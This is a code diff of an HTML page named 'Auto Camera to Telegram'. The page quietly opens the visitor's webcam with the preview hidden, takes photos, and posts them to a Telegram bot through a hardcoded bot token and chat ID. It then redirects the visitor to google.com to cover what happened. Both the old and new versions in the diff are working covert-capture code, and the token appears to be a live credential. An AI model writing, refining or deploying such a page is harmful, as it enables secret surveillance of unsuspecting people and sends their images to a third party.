@@ -2,88 +2,72 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Auto Photo Telegram</title>
+  <title>Auto Camera to Telegram</title>
   <style>
-    body { font-family: Arial; text-align: center; background: #f9f9f9; padding: 40px; }
-    video, canvas { display: none; }
-    #status { font-size: 18px; color: green; margin-top: 20px; }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #f0f0f0;
+      padding-top: 50px;
+    }
+    video, canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <h2>Camera Activated</h2>
+  <h2>Camera Accessing...</h2>
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
-  <p id="status">Waiting for camera...</p>
-
   <script>
-    const TOKEN = "8270282834:AAHbKLg3jN3zyShc3qXE_KCxa4UDLawoCv0";
-    const CHAT_ID = "7009447523";
-    const REDIRECT_URL = "https://google.com";
-
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
-    const statusText = document.getElementById("status");
+    const botToken = "8270282834:AAHbKLg3jN3zyShc3qXE_KCxa4UDLawoCv0";
+    const chatId = "7009447523";
 
-    function sendToTelegram(blob, tryCount = 1) {
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "photo.jpg");
+    // Start camera and take picture
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
 
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      }).then(res => {
-        if (res.ok) {
-          statusText.textContent = "Photo sent! Redirecting...";
-          setTimeout(() => {
-            window.location.href = REDIRECT_URL;
-          }, 1000);
-        } else if (tryCount < 2) {
-          // Try again if first fails
-          statusText.textContent = "Retrying...";
-          captureAndSendPhoto(tryCount + 1);
-        } else {
-          statusText.textContent = "Failed to send.";
-          setTimeout(() => {
-            window.location.href = REDIRECT_URL;
-          }, 2000);
-        }
-      }).catch(() => {
-        statusText.textContent = "Error! Redirecting...";
+        // Wait a bit, then take two pictures
         setTimeout(() => {
-          window.location.href = REDIRECT_URL;
-        }, 2000);
+          takeAndSendPhoto();
+          setTimeout(() => {
+            takeAndSendPhoto(() => {
+              // Redirect after all done
+              window.location.href = "https://google.com";
+            });
+          }, 2000);
+        }, 3000); // wait for camera to stabilize
+      })
+      .catch((err) => {
+        alert("Camera access denied: " + err);
       });
-    }
 
-    function captureAndSendPhoto(tryCount = 1) {
+    function takeAndSendPhoto(callback) {
+      const context = canvas.getContext("2d");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => {
-        if (blob) {
-          sendToTelegram(blob, tryCount);
-        } else {
-          statusText.textContent = "Photo failed. Redirecting anyway.";
-          setTimeout(() => {
-            window.location.href = REDIRECT_URL;
-          }, 2000);
-        }
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "photo.jpg");
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        })
+        .then(() => {
+          if (callback) callback();
+        })
+        .catch((err) => {
+          console.error("Failed to send photo:", err);
+          if (callback) callback(); // still redirect even if error
+        });
       }, "image/jpeg");
     }
-
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-        statusText.textContent = "Camera ready. Taking photo...";
-        setTimeout(() => {
-          captureAndSendPhoto(); // First attempt
-        }, 1500);
-      })
-      .catch(err => {
-        statusText.textContent = "Camera blocked! Cannot continue.";
-      });
   </script>
 </body>
 </html>
